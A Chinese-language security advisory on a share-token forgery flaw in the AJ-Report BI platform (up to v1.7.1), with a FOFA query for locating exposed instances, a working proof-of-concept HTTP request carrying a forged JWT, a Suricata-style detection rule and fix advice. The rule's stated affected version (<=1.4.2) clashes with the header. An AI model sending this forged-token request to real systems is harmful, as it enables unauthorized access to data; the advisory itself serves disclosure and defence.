# AJ-ReportBI平台存在逻辑缺陷漏洞

AJ-ReportBI平台存在逻辑缺陷漏洞，攻击者可利用该漏洞导致系统被控。

# 影响版本

AJ-Report<=v1.7.1

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="AJ-Report"

POC/EXP：利用脚本获取token 再进行利用

```
GET /dataSet/queryAllDataSet HTTP/1.1
Host: 192.168.1.14:9095
Share-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyZXBvcnRDb2RlIjoiIiwic2hhcmVDb2RlIjoieCJ9.-gbPZslLSlbE1GYp_k-DFjEkwwaiRVgcoxXPX3uqAsQ
```

![image-20260913110047908](assets/image-20260913110047908.png)

![image-20260913110105855](assets/image-20260913110105855.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"AJ-Report BI - /dataSet/queryAllDataSet 携带伪造Share-Token 逻辑缺陷/越权信息枚举";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri;
        content:"/dataSet/queryAllDataSet";
        fast_pattern;
    http.header_names;
        content:"share-token";
    http.request_header; header:"Share-Token"; content:"eyJ";
    metadata:
        service http,
        affected_product "anji-plus AJ-Report <=1.4.2",
        cve "CVE-2024-52786",
        cve "CVE-2024-5354",
        vulnerability_type "Auth Logic Flaw / Share-Token Forgery / Info Disclosure",
        severity "high";
    classtype:web-application-attack;
    sid:1000733;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
